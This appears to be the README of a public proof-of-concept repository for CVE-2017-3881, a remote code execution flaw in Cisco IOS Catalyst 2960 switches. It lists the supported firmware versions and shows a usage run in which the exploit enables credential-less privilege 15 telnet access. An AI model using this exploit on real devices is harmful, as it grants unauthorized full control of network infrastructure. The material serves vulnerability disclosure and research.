CVE-2017-3881 Cisco IOS remote code execution
===================


This repository contains Proof-Of-Concept code for exploiting remote code execution vulnerability disclosed by Cisco Systems on March 17th 2017 - <https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20170317-cmp> 


Description
-------------
Exploit write-up is available here - <https://artkond.com/2017/04/10/cisco-catalyst-remote-code-execution/>

RCE exploit code is available for Cisco Catalyst 2960 switch model. This exploit is firmware dependent. Two firmware versions are supported:

- 12.2(55)SE1  C2960-LANBASEK9-M
 
- 12.2(55)SE11 C2960-LANBASEK9-M

Denial of service code is available as a metasploit ruby module. This should work for most of the switches mentioned in the Cisco advisory (confirmation needed).

Usage example
-------------

```
$ python c2960-lanbasek9-m-12.2.55.se11 192.168.88.10 --set
[+] Connection OK
[+] Recieved bytes from telnet service: '\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18\xff\xfd\x1f'
[+] Sending cluster option
[+] Setting credless privilege 15 authentication
[+] All done
$ telnet 192.168.88.10
Trying 192.168.88.10...
Connected to 192.168.88.10.
Escape character is '^]'.

catalyst1#show priv
Current privilege level is 15
```


Author
------

Artem Kondratenko https://twitter.com/artkond
